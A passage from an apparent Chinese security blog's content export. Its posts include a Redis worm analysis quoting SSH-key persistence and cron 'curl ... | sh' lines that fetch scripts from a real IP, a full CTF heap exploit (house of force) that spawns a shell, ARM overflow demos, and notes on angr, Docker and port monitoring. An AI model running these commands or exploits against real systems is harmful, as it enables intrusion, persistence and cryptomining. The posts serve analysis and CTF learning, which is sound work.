AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX&apos; &gt; /root/.ssh/authorized_keysecho &apos;*/15 * * * * curl -fsSL http://47.93.38.159:8080/ash.sh|sh&apos; &gt; /var/spool/cron/rootecho &apos;*/20 * * * * curl -fsSL http://47.93.38.159:8080/ash.sh|sh&apos; &gt; /var/spool/cron/crontabs/rootyum install -y bash 2&gt;/dev/nullapt install -y bash 2&gt;/dev/nullapt-get install -y bash 2&gt;/dev/nullbash -c &apos;curl -fsSL http://47.93.38.159:8080/bsh.sh|bash&apos; 2&gt;/dev/nullservice crond restart bsh.sh就是常规的挖矿套路了 下载挖矿程序，并添加到开机自启动 最后安装iptables等软件，masscan扫描工具，下载rsh.sh并执行 最后看看rsh.sh,首先只允许本地连接6379端口，尝试ssh到之前连接过的主机执行下载ash.sh进行蠕虫式传播 还有利用之前的masscan进行内网扫描开放的6379端口进行蠕虫式传播 脚本sha256fdc717003b665286792be8b95337b47b1066e1b44df90046baa9a8dbae7eab7cbb33db427153eba06086013a677ec3fff195d3e75577e93938a3174e37e4fd9dab95a9e7a65ef7eea32e59834c12ce7e22f4d06422c916fdd6239648836eece5","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://www.giantbranch.cn/tags/redis/"}]},{"title":"house of force —— BCTF 2016-bcloud","slug":"house of force —— BCTF 2016-bcloud","date":"2018-08-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/08/13/house of force —— BCTF 2016-bcloud/","link":"","permalink":"https://www.giantbranch.cn/2018/08/13/house of force —— BCTF 2016-bcloud/","excerpt":"","text":"这个技术就是覆盖top chunk的size，控制下下次分配的返回内存，从而进行任意写 保护，可以写got表 12345Arch: i386-32-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x8048000) 功能（show 是没用的） 1234561.New note2.Show note3.Edit note4.Delete note5.Syn6.Quit 漏洞1：信息泄露 12345678910111213141516unsigned int sub_80487A1()&#123; char name; // [esp+1Ch] [ebp-5Ch] char *v2; // [esp+5Ch] [ebp-1Ch] unsigned int v3; // [esp+6Ch] [ebp-Ch] v3 = __readgsdword(0x14u); memset(&amp;name, 0, 0x50u); puts(&quot;Input your name:&quot;); sub_804868D((int)&amp;name, 0x40, 10); v2 = (char *)malloc(0x40u); p_name = (int)v2; strcpy(v2, &amp;name); // 假如我们name是40长度，name后面的v2也会复制到v2，那就输出了堆上面的地址 vuloutput((int)v2); return __readgsdword(0x14u) ^ v3;&#125; 利用 123456p.recvuntil(&quot;Input your name:\\n&quot;)p.sendline(&quot;A&quot; * 0x40)p.recvuntil(&quot;A&quot; * 0x40)leak = p.recv(4)heap_addr = u32(leak)print &quot;heap_addr: &quot; + hex(heap_addr) 漏洞2：堆溢出 这也是利用strcpy的赋值到\\x00才停止 1234567891011121314151617181920212223unsigned int sub_804884E()&#123; char org; // [esp+1Ch] [ebp-9Ch] char *v2; // [esp+5Ch] [ebp-5Ch] int host; // [esp+60h] [ebp-58h] char *v4; // [esp+A4h] [ebp-14h] unsigned int v5; // [esp+ACh] [ebp-Ch] v5 = __readgsdword(0x14u); memset(&amp;org, 0, 0x90u); puts(&quot;Org:&quot;); getInput((int)&amp;org, 0x40, 10); puts(&quot;Host:&quot;); getInput((int)&amp;host, 0x40, 10); v4 = (char *)malloc(0x40u); v2 = (char *)malloc(0x40u); dword_804B0C8 = (int)v2; dword_804B148 = (int)v4; strcpy(v4, (const char *)&amp;host); strcpy(v2, &amp;org); puts(&quot;OKay! Enjoy:)&quot;); return __readgsdword(0x14u) ^ v5;&#125; 利用 1234p.recvuntil(&quot;Org:\\n&quot;)p.send(&quot;B&quot; * 0x40)p.recvuntil(&quot;Host:\\n&quot;)p.send(&quot;\\xff\\xff\\xff\\xff&quot;) 这就把top chunk size覆盖成0xffffffff了 那接下来我们申请的大小要怎么搞呢，先看看原理 将top chunk的size改为0xffffffffffffffff，这样我们malloc很大的值也不用再去mmap新的内存了之后申请一个一个负数大小的，所以top chunk指针会减去这么一个值，但是第一次申请的时候malloc还是返回原理top chunk的位置那么当我们再次申请的时候，top chunk就返回了我们想要的地址了那个负数是怎么得来的呢？因为我们malloc之后，top指针会加上我们的size，所以我们只需要malloc我们想要的地址跟top指针的差别再减0x10的头部就行了（64位的话）【即目标地址-topchunk指针-0x10】，那么32位就减8 假如我们要控制0x0804B0A0,储存len的地方 12malloc_size = &quot;-&quot; + str(-(noteLenArr - (first_heap_addr + 0xd0) - 0x8))newNote(malloc_size, &quot;&quot;) 结果如下 那接下来我们就覆盖note指针，那就可以任意地址写，我们将free覆盖成printf的got之后我们利用free函数调用，泄露atoi函数，再计算出system函数地址，最后利用system函数地址覆盖atoi的got表，再发送/bin/sh\\x00即可 完整exp 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-08-13 23:29:22# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from pwn import *context.log_level = &quot;debug&quot;p = process(&quot;./bcloud&quot;)# p = process([&apos;./bcloud&apos;], env=&#123;&quot;LD_PRELOAD&quot;:&quot;./libc-2.19.so&quot;&#125;)elf = ELF(&apos;./bcloud&apos;)libc = ELF(&apos;./libc.so.6&apos;)def getpid(): print proc.pidof(p)[0] pause() def newNote(length, content): p.recvuntil(&quot;option---&gt;&gt;\\n&quot;) p.sendline(&quot;1&quot;) p.recvuntil(&quot;Input the length of the note content:\\n&quot;) p.sendline(str(length)) p.recvuntil(&quot;Input the content:\\n&quot;) p.send(content)def editNote(id, content): p.recvuntil(&quot;option---&gt;&gt;\\n&quot;) p.sendline(&quot;3&quot;) p.recvuntil(&quot;Input the id:\\n&quot;) p.sendline(str(id)) p.recvuntil(&quot;Input the new content:\\n&quot;) p.sendline(content)noteLenArr = 0x0804B0A0got_atoi = elf.got[&apos;atoi&apos;]got_free = elf.got[&apos;free&apos;]# because did&apos;t call in the programplt_printf = elf.plt[&apos;printf&apos;]# leakp.recvuntil(&quot;Input your name:\\n&quot;)p.send(&quot;A&quot; * 0x3c + &quot;QQQQ&quot;)p.recvuntil(&quot;QQQQ&quot;)leak = p.recv(4)first_heap_addr = u32(leak)print &quot;first_heap_addr: &quot; + hex(first_heap_addr) # overwrite top chunk sizep.recvuntil(&quot;Org:\\n&quot;)p.send(&quot;B&quot; * 0x40)p.recvuntil(&quot;Host:\\n&quot;)p.sendline(&quot;\\xff\\xff\\xff\\xff&quot;)######## change top chunk point####### # first_heap_addr + 0xd0 is top chunk point# malloc_addr = top chunk point + malloc_size # 0x8 size of headermalloc_size = &quot;-&quot; + str(-(noteLenArr - (first_heap_addr + 0xd0) - 0x8))print &quot;mysize: &quot; + malloc_size# size = (0xffffffff - first_heap_addr - 224) + noteLenArr - 4# log.info(&quot;Size: &quot; + hex(size)) # size = (0xffffffff ^ size) + 1# print &quot;last size: &quot; + str(size)newNote(malloc_size, &quot;&quot;)# write notearrarypayload = p32(4)payload += p32(4)payload += p32(4) * 29payload += p32(got_free)payload += p32(got_atoi)payload += p32(got_atoi)newNote(len(payload), payload)# change got_free to plt_printfeditNote(1, p32(plt_printf))# get atoi&apos;s addressp.recvuntil(&quot;option---&gt;&gt;\\n&quot;)p.sendline(&quot;4&quot;)p.recvuntil(&quot;Input the id:\\n&quot;)p.sendline(&quot;2&quot;)atoi_addr = u32(p.recv(4))print &quot;atoi_addr: &quot; + hex(atoi_addr) # overwrite atoi with systemprint &quot;\\ncalculating system() addr&quot;system_addr = atoi_addr - (libc.symbols[&apos;atoi&apos;] - libc.symbols[&apos;system&apos;])print &quot;system_addr = &quot; + hex(system_addr)pause()editNote(3, p32(system_addr))p.sendline(&quot;/bin/sh\\x00&quot;)p.interactive() referencehttp://uaf.io/exploitation/2016/03/20/BCTF-bcloud.html","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"https://www.giantbranch.cn/tags/heap/"},{"name":"ctf","slug":"ctf","permalink":"https://www.giantbranch.cn/tags/ctf/"}]},{"title":"虚拟机中的kali linux没有了eth0，只有lo接口了怎么办","slug":"虚拟机中的kali linux没有了eth0，只有lo接口了怎么办","date":"2018-08-13T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/08/13/虚拟机中的kali linux没有了eth0，只有lo接口了怎么办/","link":"","permalink":"https://www.giantbranch.cn/2018/08/13/虚拟机中的kali linux没有了eth0，只有lo接口了怎么办/","excerpt":"","text":"问题如下：，没有了eth0 123456789root@kali:~# ifconfig lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 1 (Local Loopback) RX packets 70 bytes 3638 (3.5 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 70 bytes 3638 (3.5 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 首先启动eth0 1ifconfig eth0 up 之后在/etc/network/interfaces文件中加入 1iface eth0 inet dhcp 最后重启网络 1service networking restart 或者interfaces写成静态ip也行 123iface eth0 inet static address 192.168.145.134 netmask 255.255.255.0","categories":[],"tags":[{"name":"问题解决","slug":"问题解决","permalink":"https://www.giantbranch.cn/tags/问题解决/"}]},{"title":"Linux Kernel Exploitation 理论学习","slug":"Linux Kernel Exploitation 理论学习","date":"2018-08-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.054Z","comments":true,"path":"2018/08/11/Linux Kernel Exploitation 理论学习/","link":"","permalink":"https://www.giantbranch.cn/2018/08/11/Linux Kernel Exploitation 理论学习/","excerpt":"","text":"基础内核为用户空间提供的一些服务 文件系统的IO 权限管理 系统调用（Syscalls） 进程管理 …… 内核通熟来说就是底层的代码（它是操作系统的核心），有两个主要的职能： 跟硬件交互，控制硬件 为应用程序提供一个运行环境 内核空间Ring0，我们用户空间就是Ring3 使用的常用的库函数也有所区别 内核管理进程，所以权限也是他管了 利用相关我们可以用commit_credit，更新进程的credentials 我们可以prepare_kernel_cred_t构造一个cred数据结构 那就是两步 由于在内核中我们很难修改文件系统，创建新的进程，创建网络连接，所以我们要回到用户空间 我们可以通过下面的方式劫持控制流 我们熟悉的防护有下面的 一些新的防护 mmap_min_addr它可以使空指针引用的漏洞利用更加困难 一般空指针引用流程如下，而mmap_min_addr不允许程序申请低地址的内存，所以极大增加了利用难度 kallsyms/proc/kallsyms提供内核的符号 假如我们没有信息泄露漏洞，那么我们就需要它 那么假如有这个防护，那么没有权限的用户就会返回0了 SMEP / SMAPSMEP: Supervisor Mode Execution ProtectionIntroduced in Intel IvyBridgeSMAP: Supervisor Mode Access ProtectionIntroduced in Intel Haswell 一般提权的代码是这样的 SMEP避免这种攻击是通过触发一个页错误(page fault)来完成大的, 就是如果一个设置了user bit的程序在ring0中执行内存中的代码，那就触发一个page fault SMAP也是类似的，不过这个是防御对数据的读取 reference https://github.com/RPISEC/MBE","categories":[],"tags":[{"name":"kernel","slug":"kernel","permalink":"https://www.giantbranch.cn/tags/kernel/"},{"name":"Exploitation","slug":"Exploitation","permalink":"https://www.giantbranch.cn/tags/Exploitation/"}]},{"title":"全端口监控的实现","slug":"全端口监控的实现","date":"2018-07-25T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/07/25/全端口监控的实现/","link":"","permalink":"https://www.giantbranch.cn/2018/07/25/全端口监控的实现/","excerpt":"","text":"方式1一个是通过抓包，一旦收到SYN，就回复一个SYN ACK但是这个需要iptables将出去的RST ACK包给拦截掉 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#!/usr/bin/env python# -*- coding: utf-8 -*-# @Date : 2018-07-23 14:50:27# @Author : giantbranch (giantbranch@gmail.com)# @Link : http://www.giantbranch.cn/# @tags : from scapy.all import *SSH_PORT = 22# 定义数据包回调函数def packet_callback(packet): # print packet.show() if TCP in packet: if packet[&quot;TCP&quot;].dport == SSH_PORT or packet[&quot;TCP&quot;].sport == SSH_PORT: return # SYN packet # 如果我们接收到一个SYN包，则我们构造一个SYN ACK包返回去。 if packet[&quot;TCP&quot;].flags == 0x02: # print &quot;receive SYN packet&quot; ip = IP(dst=packet[&quot;IP&quot;].src, src=packet[&quot;IP&quot;].dst) tcp = TCP(sport=packet[&quot;TCP&quot;].dport, dport=packet[&quot;TCP&quot;].sport) # syn ack flags tcp.flags = 0x012 tcp.ack = packet[&quot;TCP&quot;].seq + 1 send(ip/tcp) # FIN ACK packet # 如果我们接收到一个FIN ACK包，我们则返回一个ACK包。否则他会重传。 elif packet[&quot;TCP&quot;].flags == 0x011: # print &quot;receive SYN packet&quot; ip = IP(dst=packet[&quot;IP&quot;].src, src=packet[&quot;IP&quot;].dst) tcp = TCP(sport=packet[&quot;TCP&quot;].dport, dport=packet[&quot;TCP&quot;].sport) # ack flags tcp.seq = packet[&quot;TCP&quot;].ack tcp.ack = packet[&quot;TCP&quot;].seq + 1 send(ip/tcp) # PSH ACK packet elif packet[&quot;TCP&quot;].flags == 0x018: # print &quot;receive PSH ACK packet&quot; if packet.haslayer(&quot;Raw&quot;): print &quot;payload is:\\n&quot; print packet[&quot;Raw&quot;] else: print &quot;tcp flags is : %s&quot; % packet[&quot;TCP&quot;].flags elif UDP in packet: pass # print &quot;this is a udp packet&quot; else: passsniff(prn=packet_callback, store=0) iptables 1iptables -A OUTPUT -p tcp --tcp-flags ALL RST,ACK -j DROP 那这样nmap扫描的时候就会以为端口都开放了 方式2通过iptables直接做一个全端口转发，转发到你自己写的程序的端口即可 If you want to redirect all TCP and UDP traffic to Blackhole use the following command: 12sudo iptables -t nat -A PREROUTING -p tcp --dport 1:65535 -j REDIRECT --to-ports 5000sudo iptables -t nat -A PREROUTING -p udp --dport 1:65535 -j REDIRECT --to-ports 5000 Suppose you have other services running on the Host e.g. 22, 445 and you don’t want to capture them via Blackhole,you can create multiple iptables rules: 123sudo iptables -t nat -A PREROUTING -p tcp --dport 1:21 -j REDIRECT --to-ports 5000sudo iptables -t nat -A PREROUTING -p tcp --dport 23:444 -j REDIRECT --to-ports 5000sudo iptables -t nat -A PREROUTING -p tcp --dport 446:65535 -j REDIRECT --to-ports 5000 优缺点抓包方式优点：1、实现简单缺点：1、有些vps，不支持伪造发送syn，ack2、难以写交互 全端口转发到一个端口优点：1、真正伪造了全端口开放的假象2、便于写对应的交互缺点：1、有时候获取不到目的端口2、无其他明显的缺点 获取到的payload是空的，有可能这个端口或者协议是服务器先发送信息的 Referencehttp://www.secniu.com/%E5%8D%81%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%AE%9E%E7%8E%B0%E7%BD%91%E7%BB%9C%E7%9A%84%E5%85%A8%E7%AB%AF%E5%8F%A3%E7%9B%91%E5%90%AC/https://github.com/dudeintheshell/blackhole","categories":[],"tags":[{"name":"全端口监控","slug":"全端口监控","permalink":"https://www.giantbranch.cn/tags/全端口监控/"}]},{"title":"安卓安全研究的list收集","slug":"安卓安全研究的list收集","date":"2018-07-24T00:00:00.000Z","updated":"2023-10-13T13:14:33.134Z","comments":true,"path":"2018/07/24/安卓安全研究的list收集/","link":"","permalink":"https://www.giantbranch.cn/2018/07/24/安卓安全研究的list收集/","excerpt":"","text":"思维导图 https://github.com/SecWiki/sec-chart/tree/master/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8 技能树 https://www.sec-wiki.com/skill/8 android-security-awesome https://github.com/ashishb/android-security-awesome Mobile Top 10 2016-Top 10 https://www.owasp.org/index.php/Mobile_Top_10_2016-Top_10 安卓漏洞信息库 http://android.scap.org.cn/index.html","categories":[],"tags":[{"name":"android security","slug":"android-security","permalink":"https://www.giantbranch.cn/tags/android-security/"}]},{"title":"docker学习笔记","slug":"docker学习笔记","date":"2018-07-22T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/07/22/docker学习笔记/","link":"","permalink":"https://www.giantbranch.cn/2018/07/22/docker学习笔记/","excerpt":"","text":"docker实在太火了 安装的话参考官方文档吧 https://docs.docker.com/install/#supported-platforms 搜索镜像（以kali为例） 1docker search kali Buildfile以下面为例 12345678910111213FROM nimmis/ubuntu:14.04 //设置基础镜像MAINTAINER nimmis &lt;kjell.havneskold@gmail.com&gt; //制作人和邮箱# disable interactive functionsENV DEBIAN_FRONTEND noninteractive //设置环境变量ADD hello.sh /bin/hello.sh // 给容器添加文件RUN /bin/hello.sh // 执行脚本# set default java environment variableENV JAVA_HOME /usr/lib/jvm/java-8-openjdk-amd64RUN apt-get install -y software-properties-common &amp;&amp; \\ //执行命令add-apt-repository ppa:openjdk-r/ppa -y &amp;&amp; \\apt-get update &amp;&amp; \\apt-get install -y --no-install-recommends openjdk-8-jre &amp;&amp; \\rm -rf /var/lib/apt/lists/ 互联volume 使用-v参数就行 link docker默认是允许container互通，通过-icc=false关闭互通。一旦关闭了互通，只能通过-link name:alias命令连接指定container.link方式 1-- link redis:db的别名，会在/etc/hosts中生成对应的ip映射 直接使用宿主主机网络 1--net=host","categories":[],"tags":[{"name":"docker","slug":"docker","permalink":"https://www.giantbranch.cn/tags/docker/"},{"name":"笔记","slug":"笔记","permalink":"https://www.giantbranch.cn/tags/笔记/"}]},{"title":"angr 漏洞发现官方例子 —— strcpy_find","slug":"angr 漏洞发现官方例子 —— strcpy_find","date":"2018-07-16T00:00:00.000Z","updated":"2023-10-13T13:14:33.058Z","comments":true,"path":"2018/07/16/angr 漏洞发现官方例子 —— strcpy_find/","link":"","permalink":"https://www.giantbranch.cn/2018/07/16/angr 漏洞发现官方例子 —— strcpy_find/","excerpt":"","text":"这个例子的程序比较简单 main函数 1234567891011121314151617181920212223242526272829int __cdecl main(int argc, const char **argv, const char **envp)&#123; size_t v3; // rbx@4 size_t v4; // rax@5 char s[8]; // [sp+10h] [bp-30h]@2 int i; // [sp+2Ch] [bp-14h]@2 if ( argc &lt;= 2 ) &#123; func3(*argv, argv, envp); &#125; else &#123; strcpy(s, &quot;Unu`mmx!onu!uid!q`rrvnse///&quot;); for ( i = 0; ; ++i ) &#123; v3 = i; if ( v3 &gt;= strlen(s) ) break; s[i] ^= 1u; &#125; v4 = strlen(s); if ( !strncmp(argv[1], s, v4) ) func(argv[2]); else func(&quot;Wrong password!&quot;); &#125; return 0;&#125; func3 1234567int __fastcall func3(__int64 a1)&#123; return printf( &quot;Usage: %s &lt;password&gt; &lt;message_to_store&gt;\\n&quot; &quot;Note: You can only post a custom message if you give the right password!\\n&quot;, a1);&#125; func 1234567int __fastcall func(const char *a1)&#123; char dest; // [sp+10h] [bp-30h]@1 strcpy(&amp;dest, a1); return printf(&quot;Your Message: %s\\n&quot;, &amp;dest);&#125; 可以看到漏洞点是在func，那我们怎么写脚本呢 载入程序，获得控制流程图，进而获取strcpy函数和func3函数的地址 构造命令行参数，创建一个entry_state和simulation_manager 从simulation_manager中找到满足当前执行到strcpy，而且strcpy的源地址真是我们输入的argv[2]那时候的状态，我们再输出argv[1],那么就找到了如何到达那个strcpy的argv[1]了 完整代码如下：（跟着官方的代码敲了一下） 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859# -*- coding: utf-8 -*-import angrimport claripydef main(): def getFuncAddress(func_name, plt = None): # for addr,func in cfg.kb.functions.iteritems(): # if func.name == func_name and (plt is None or func.is_plt == plt): # return func.addr found = [ addr for addr,func in cfg.kb.functions.iteritems() if func_name == func.name and (plt is None or func.is_plt == plt) ] if len( found ) &gt; 0: print &quot;Found &quot;+func_name+&quot;&apos;s address at &quot;+hex(found[0])+&quot;!&quot; return found[0] else: raise Exception(&quot;No address found for function : &quot;+func_name) def check(state): if (state.ip.args[0] == strcpy_addr): BV_strCpySrc = state.memory.load(state.regs.rsi, len(argv[2])) strCpySrc = state.solver.eval( BV_strCpySrc , cast_to=str ) return True if argv[2] in strCpySrc else False else: return False project = angr.Project(&quot;./strcpy_test&quot;, load_options=&#123;&apos;auto_load_libs&apos;:False&#125;) # get control flow graph cfg = project.analyses.CFG(fail_fast=True) strcpy_addr = getFuncAddress(&quot;strcpy&quot;, True) func3_addr = getFuncAddress(&quot;func3&quot;) argv = [project.filename] #argv[0] sym_arg_size = 40 sym_arg = claripy.BVS(&apos;sym_arg&apos;, 8*sym_arg_size) argv.append(sym_arg) #argv[1] argv.append(&quot;HAHAHAHA&quot;) # argv[2] state = project.factory.entry_state(args=argv) sm = project.factory.simulation_manager(state) sm = sm.explore(find=check, avoid=(func3_addr,)) found = sm.found if ( len( found ) &gt; 0 ): # Make sure we found a path before giving the solution found = sm.found[0] result = found.solver.eval(argv[1], cast_to=str) try: result = result[:result.index(&apos;\\0&apos;)] except ValueError: pass else: # Aww somehow we didn&apos;t find a path. Time to work on that check() function! result = &quot;Couldn&apos;t find any paths which satisfied our conditions.&quot; print &apos;The password is &quot;%s&quot;&apos; % result main() 运行结果： 1234(angr) angr@e766290917a5:~/angr-workdir/examples/strcpy_find$ python angrexp.py Found strcpy&apos;s address at 0x4004a0L!Found func3&apos;s address at 0x40061d!The password is &quot;Totally not the password...&quot; 验证 12(angr) angr@e766290917a5:~/angr-workdir/examples/strcpy_find$ ./strcpy_test &quot;Totally not the password...&quot; &quot;giantbranch test&quot;Your Message: giantbranch test Referencehttps://docs.angr.io/docs/examples.html#vulnerability-discovery","categories":[],"tags":[{"name":"angr","slug":"angr","permalink":"https://www.giantbranch.cn/tags/angr/"},{"name":"符号执行","slug":"符号执行","permalink":"https://www.giantbranch.cn/tags/符号执行/"},{"name":"漏洞发现","slug":"漏洞发现","permalink":"https://www.giantbranch.cn/tags/漏洞发现/"}]},{"title":"ARM中的进程内存和内存破坏","slug":"ARM中的进程内存和内存破坏","date":"2018-07-11T00:00:00.000Z","updated":"2023-10-13T13:14:33.050Z","comments":true,"path":"2018/07/11/ARM中的进程内存和内存破坏/","link":"","permalink":"https://www.giantbranch.cn/2018/07/11/ARM中的进程内存和内存破坏/","excerpt":"","text":"注：本位为简译文章，原文见最后的reference 进程的内存布局程序载入内存会分成多个段，我们关心下面三个 程序空间 堆 栈 一般情况下布局如下 我们可以通过gef看到内存布局及权限 123456789101112131415161718192021222324252627282930313233azeria@labs:~/exp $ gdb program...gef&gt; gef config context.layout &quot;code&quot;gef&gt; break mainBreakpoint 1 at 0x104c4: file program.c, line 6.gef&gt; run...gef&gt; nexti 2-----------------------------------------------------------------------------------------[ code:arm ]----... 0x104c4 &lt;main+20&gt; mov r0, #8 0x104c8 &lt;main+24&gt; bl 0x1034c &lt;malloc@plt&gt;-&gt; 0x104cc &lt;main+28&gt; mov r3, r0 0x104d0 &lt;main+32&gt; str r3, [r11, #-8]...gef&gt; vmmapStart End Offset Perm Path0x00010000 0x00011000 0x00000000 r-x /home/azeria/exp/program &lt;---- Program Image0x00020000 0x00021000 0x00000000 rw- /home/azeria/exp/program &lt;---- Program Image continues...0x00021000 0x00042000 0x00000000 rw- [heap] &lt;---- HEAP0xb6e74000 0xb6f9f000 0x00000000 r-x /lib/arm-linux-gnueabihf/libc-2.19.so &lt;---- Shared library (libc)0xb6f9f000 0xb6faf000 0x0012b000 --- /lib/arm-linux-gnueabihf/libc-2.19.so &lt;---- libc continues...0xb6faf000 0xb6fb1000 0x0012b000 r-- /lib/arm-linux-gnueabihf/libc-2.19.so &lt;---- libc continues...0xb6fb1000 0xb6fb2000 0x0012d000 rw- /lib/arm-linux-gnueabihf/libc-2.19.so &lt;---- libc continues...0xb6fb2000 0xb6fb5000 0x00000000 rw-0xb6fcc000 0xb6fec000 0x00000000 r-x /lib/arm-linux-gnueabihf/ld-2.19.so &lt;---- Shared library (ld)0xb6ffa000 0xb6ffb000 0x00000000 rw-0xb6ffb000 0xb6ffc000 0x0001f000 r-- /lib/arm-linux-gnueabihf/ld-2.19.so &lt;---- ld continues...0xb6ffc000 0xb6ffd000 0x00020000 rw- /lib/arm-linux-gnueabihf/ld-2.19.so &lt;---- ld continues...0xb6ffd000 0xb6fff000 0x00000000 rw-0xb6fff000 0xb7000000 0x00000000 r-x [sigpage]0xbefdf000 0xbf000000 0x00000000 rw- [stack] &lt;---- STACK0xffff0000 0xffff1000 0x00000000 r-x [vectors] 栈溢出如图，就是程序对用户输入的长度做限制，导致可以覆盖LR寄存器的味道，通过精心地控制，即可达到任意代码执行的目的 我们用如下程序测试 12345678/*azeria@labs:~/exp $ gcc stack.c -o stack*/#include &quot;stdio.h&quot;int main(int argc, char **argv)&#123;char buffer[8];gets(buffer);&#125; 汇编代码如下： 我们输入7个A，可以看到 R11（即FP）和LR储存的位置还没被覆盖 假如我们输入16个A，可以看到都覆盖了，之后的pop {r11, pc}就会让攻击者劫持控制流了 继续运行，确实被控制了，程序也蹦了 堆溢出堆相对复杂，我们malloc一次，就会得到一个chunk，这个chunk有header和user data，堆溢出有下面图中的两种：一个是chunk内部，一个是溢出到另一个chunk了 chunk内部溢出 示例代码 123456789101112131415161718192021222324252627/*azeria@labs:~/exp $ gcc intra_chunk.c -o intra_chunk -O*/#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;struct u_data //object model: 8 bytes for name, 4 bytes for number&#123; char name[8]; int number;&#125;;int main ( int argc, char* argv[] )&#123; struct u_data* objA = malloc(sizeof(struct u_data)); //create object in Heap objA-&gt;number = 1234; //set the number of our object to a static value gets(objA-&gt;name); //set name of our object according to user&apos;s input if(objA-&gt;number == 1234) //check if static value is intact &#123; puts(&quot;Memory valid&quot;); &#125; else //proceed here in case the static value gets corrupted &#123; puts(&quot;Memory corrupted&quot;); &#125;&#125; 可以看到，假如我们分配一个结构体的内存，假如对name的输入没有限制，那么number也是我们可以控制的 汇编如下： 输入7个A 堆从0x00021000开始，结构如下，number还没被覆盖 但是我们输入8个A，那么number的最低位就被00覆盖了 那就可以改变程序的执行流程 chunk外部溢出 示例代码如下: 123456789101112131415161718192021/*azeria@labs:~/exp $ gcc inter_chunk.c -o inter_chunk*/#include &quot;stdlib.h&quot;#include &quot;stdio.h&quot;int main ( int argc, char* argv[] )&#123; char *some_string = malloc(8); //create some_string &quot;object&quot; in Heap int *some_number = malloc(4); //create some_number &quot;object&quot; in Heap *some_number = 1234; //assign some_number a static value gets(some_string); //ask user for input for some_string if(*some_number == 1234) //check if static value (of some_number) is in tact &#123; puts(&quot;Memory valid&quot;); &#125; else //proceed here in case the static some_number gets corrupted &#123; puts(&quot;Memory corrupted&quot;); &#125;&#125; 差不多，我们也先输入7个A，可以看到堆的结构如下 16个A，header和some_number都被覆盖了 也同样可以改变执行流程 Referencehttps://azeria-labs.com/process-memory-and-memory-corruption/","categories":[],"tags":[{"name":"pwn","slug":"pwn","permalink":"https://www.giantbranch.cn/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"https://www.giantbranch.cn/tags/heap/"},{"name":"arm","slug":"arm","permalink":"https://www.giantbranch.cn/tags/arm/"},{"name":"stack","slug":"stack","permalink":"https://www.giantbranch.cn/tags/stack/"},{"name":"format string","slug":"format-string","permalink":"https://www.giantbranch.cn/tags/format-string/"},{"name":"Dangling pointer","slug":"Dangling-pointer","permalink":"https://www.giantbranch.cn/tags/Dangling-pointer/"}]},{"title":"《不止代码》的要点","slug":"《不止代码》的要点","date":"2018-07-10T00:00:00.000Z","updated":"2023-10-13T13:14:33.130Z","comments":true,"path":"2018/07/10/《不止代码》的要点/","link":"","permalink":"https://www.giantbranch.cn/2018/07/10/《不止代码》的要点/","excerpt":"","text":"如何成长为技术大牛误区拜大牛为师 1、大牛很忙，不太可能单独给你开小灶2、带着问题去请教或者探讨，但是不能经常问那些书本或者 google 能够很容易查到的知识，大牛们也会很不耐烦的，毕竟时间宝贵。3、大牛不多，不太可能每个团队都有技术大牛，只能说团队里面会有比你水平高的人，即使他每天给你开小灶，最终你也只能提升到他的水平； 所以成为大牛还是得靠自己 业务代码一样很牛逼 业务代码都写不好的程序员肯定无法成为技术大牛，但只把业务代码写好的程序员也还不能成为技术大牛。 上班太忙没时间自己学习 1、应该在工作中学习和提升2、利用碎片时间学习 正确的做法Do more：熟悉更多业务，熟悉更多代码；熟悉端到端；自学——能够从头开始做，即使没有组件和框架Do better: 能不能改进Do exercise: learning、trying、teaching 技术变化那么快，程序员如何做到不被淘汰？软件架构就是将人员、技术等资源组织起来以解决业务问题，支撑业务增长的一种活动。 组织业务：架构师通过探索和研究业务领域的知识，构建自身看待业务的”世界观”。他会基于这种认识拆分业务生命周期，确立业务边界，构建出了一套解决特定业务问题的领域模型，并且确认模型之间、领域之间的关系与协作方式，完成了对业务领域内的要素的组织工作。 组织技术：为了能在计算机世界中运作人类社会的业务模型，架构师需要选用计算机世界中合适的框架、中间件、编程语言、网络协议等技术工具依据之前设计方案组织起来形成一套软件系统方案，在我看来软件系统就像是一种技术组织，即技术组件、技术手段依据某种逻辑被组织起来了，这些技术工具被确定了职责，有了明确分工，并以实现业务功能为目标集合在了一起。比如 RPC 